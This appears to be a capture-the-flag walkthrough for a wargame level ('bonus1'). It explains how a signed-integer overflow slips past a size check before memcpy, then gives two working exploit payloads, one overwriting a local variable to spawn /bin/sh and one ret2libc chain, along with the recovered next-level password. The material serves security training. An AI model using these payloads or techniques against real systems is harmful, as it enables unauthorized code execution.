# Bonus 1

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector source.c
```

Let's take a look at the source code:
```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
    int ret; // Can't use size_t directly because of the if condition optimization
    char buf[40];

    ret = atoi(argv[1]);
    if (ret > 9)
        return 1;

    memcpy(buf, argv[2], (size_t)ret << 2);
    if (ret == 0x574f4c46)
        execl("/bin/sh", "sh", 0);

    return 0;
}
```

Let's focus on the `main` function. It reads input from the command line and then `atoi` converts it to an integer. If the integer is greater than 9, the program exits. Otherwise, it copies the second argument to the `buf` buffer using `memcpy` with a size of `ret << 2` (equivalent to `ret * 4`).  
If we successfully bypass the `ret > 9` check, we can overflow the buffer, which would allow us to write over `ret` and potentially reach the `execl` call or over the return address.

Let's use the following `C` program to figure out a way to bypass the `ret > 9` check:
```c
#include <stdio.h>
#include <stdlib.h>

int main(int ac, char **av)
{
        printf("%lld vs %d\n", (long long)atoi(av[1]) * 4, atoi(av[1]) * 4);
}
```

Let's compile it and run it with different values:
```bash
❯ gcc -m32 uwu.c

❯ ./a.out -2147483648
-8589934592 vs 0

❯ ./a.out -2147483647
-8589934596 vs 4

❯ ./a.out -2147483637
-8589934548 vs 44
```

As we can see, If we provide values close to `INT_MIN` and multiply them by 4, we get a positive value. This is because of the way signed integers are represented in memory, such as:
```
-2147483648 * 4:
Binary:        10000000000000000000000000000000
Multiply by 4: 00000000000000000000000000000000
The result is 0 due to overflow.

-2147483647 * 4:
Binary:        10000000000000000000000000000001
Multiply by 4: 00000000000000000000000000000100
The result is 4. The overflow causes the sign bit to flip, making the result positive.

-2147483637 * 4:
Binary:        10000000000000000000000000001011
Multiply by 4: 00000000000000000000000000101100
The result is 44. Again, overflow causes the sign bit to flip.
```

Let's use `ltrace` to check our assumptions:
```bash
bonus1@RainFall:~$ ltrace ./bonus1 -2147483637 TEST
[...]
atoi(0xbffff902, 0x8049764, 3, 0x80482fd, 0xb7fd13e4) = 0x8000000b
memcpy(0xbffff704, "TEST", 44) = 0xbffff704
```

As we can see, `atoi` returns `0x8000000b` which is `11` in decimal (if we ignore the 8). Furthermore, `memcpy` copies `44` bytes to the buffer, which means we can write over `ret`.

There's different ways to solve this challenge, we'll see two of them. First the intended way with writing over the int and then the ret2libc way.

### Write over the int
As mentionned above, we can write over the `ret` variable with the following:
```bash
number + padding + value of ret

-2147483637 + 40 * A + 0x574f4c46
```

Indeed since `-2147483638` allows us to write `44` bytes to the buffer, we can write `40` bytes of padding and then the value of `ret` so that the `if` condition is satisfied.

Let's try it:
```bash
./bonus1 -2147483637 `python -c 'print "A"*40 + "\x57\x4f\x4c\x46"[::-1]'`
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

Perfect, let's move to the other solution.

### Ret2Libc
Check the [level1's walkthrough](../level1/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xb7e6b060  __libc_system
0xb7e6b060  system

# Exit
(gdb) info functions exit
0xb7e5ebe0  exit

# /bin/sh
(gdb) info proc mappings
[...]
Start Addr   End Addr       Size     Offset objfile
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
[...]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

To find our padding, we'll use a [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/):
```bash
(gdb) r -2147483615 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 
Starting program: /home/user/bonus1/bonus1 -2147483615 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x39624138 in ?? ()
```

Therefore we need 56 bytes of padding.

Alright, let's craft our payload:
```
number + padding + address of system + address of exit + address of "/bin/sh"

-2147483631 + 56 * A  + "\xb7\xe6\xb0\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
```

Let's run it:
```bash
./bonus1 -2147483631 `python -c 'print("A"*56 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])'`
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

We are now bonus2! Let's move on to the next level.
